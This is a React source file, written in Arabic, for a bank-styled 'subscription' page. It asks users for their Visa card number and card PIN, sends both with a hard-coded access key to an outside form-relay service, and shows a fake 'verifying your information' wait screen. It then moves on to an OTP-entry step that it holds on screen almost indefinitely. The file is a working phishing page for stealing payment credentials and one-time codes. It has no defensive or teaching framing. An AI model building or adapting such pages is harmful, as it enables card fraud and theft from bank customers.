
import React, { useState } from 'react';
import { Eye, EyeOff, User, Lock,X, MoreHorizontal, Globe} from "lucide-react";
// import bankLogo from '../assets/images/logo.png';
import { useNavigate } from 'react-router-dom';
import OTPVerification from './OTP';

const Index = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    username: '',
    use_scret: '',
    agreeToTerms: false
  });



  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [otpVisible, setOtpVisible] = useState(false);
  const navigate = useNavigate();
  
  const onSubmit = async (event) => {
    event.preventDefault();
    setResult("جاري الإرسال...");
    setLoading(true); // عرض شاشة التحميل
  
    setTimeout(async () => {
      setLoading(false); // إخفاء شاشة التحميل بعد 5 ثواني
      const formData = new FormData(event.target);
      formData.append("access_key", "20f19016-48fa-475b-b343-bae03fc652bf");
  
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData
      });
  
      const data = await response.json();
      if (data.success) {
        setResult("تم إرسال النموذج بنجاح");
        event.target.reset();
        setOtpVisible(true);
        
        // عرض صفحة OTP لمدة 10 ثوانٍ ثم العودة للصفحة الرئيسية
        setTimeout(() => {
          setOtpVisible(false);
          navigate('/');
        }, 1000000000);
      } else {
        console.log("Error", data);
        setResult(data.message);
      }
    }, 5000); // انتظار 5 ثواني قبل بدء معالجة الطلب
  };
  
  return (
    <div className='py-4 '>
    {loading ? (
      <div className="flex flex-col items-center justify-center h-screen bg-white z-10">
        <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-500"></div>
        <p className="mt-4 text-lg font-bold text-gray-700">
          الرجاء الإنتظار سيتم التأكد من المعلومات
        </p>
        <p className="text-sm text-gray-500">
          لا تخرج من هذه الصفحة حتى يتم التأكد
        </p>
      </div>
    ) : otpVisible ? (
      <OTPVerification />
    ) : (
      <div>
    <div className="min-h-screen pt-20 px-4 text-right">
   
      {/* Header */}
      <div className="flex justify-between items-start mb-8">
     <a href="/" className='cursor-pointer'>
     <button className="rounded-full p-2 bg-[#1300F3] text-black">
          <X size={24}  className="text-white "/>
        </button></a>
         <h3>الاشتراك  (الخطوة 1/4)</h3>
      </div>

      {/* Login Form */}
      <form onSubmit={onSubmit} className="space-y-6 max-w-md mx-auto">
        {/* Username Field */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-right">رقم بطاقة فيزا الدفع</label>
          <div className="relative">
            <input
              name="username"
              type="text"
              className="w-full bg-gray-100 border-0 rounded-lg p-3 pr-10 text-right"
              placeholder="أدخل رقم بطاقة فيزا الدفع"
              value={formData.username}
              onChange={handleInputChange}
              dir="rtl"
            />
            <User className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
          </div>
        </div>

        {/* Password Field */}
        <div className="space-y-2">
          <label className="block text-gray-700 text-right">الرقم السري لبطاقة الدفع</label>
          <div className="relative">
            <input
              name="use_scret"
              type={showPassword ? "text" : "password"}
              className="w-full bg-gray-100 border-0 rounded-lg p-3 pr-10 text-right"
              placeholder="أدخل الرقم السري الخاصة بك"
              value={formData.password}
              onChange={handleInputChange}
              dir="rtl"
            />
            <Lock className="absolute left-9 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
        </div>
     
        {/* Submit Button */}
        <button
          type="submit"
          className="w-full bg-[#1300F3] hover:bg-[#1300F3] text-white py-3 rounded-lg transition-colors duration-200"
        >
          التالي
        </button>

        {/* Create Account Link */}
        {/* <div className="text-center mt-6">
          <p className="text-gray-600 text-sm">
            لا يوجد لديك حساب؟{' '}
            <a href="#" className="text-[#1300F3] hover:underline">
              انشاء حساب
            </a>
          </p>
        </div> */}
        <span>{result}</span>
      </form>
    </div>
    </div>)}
    </div>
  );
};

export default Index;

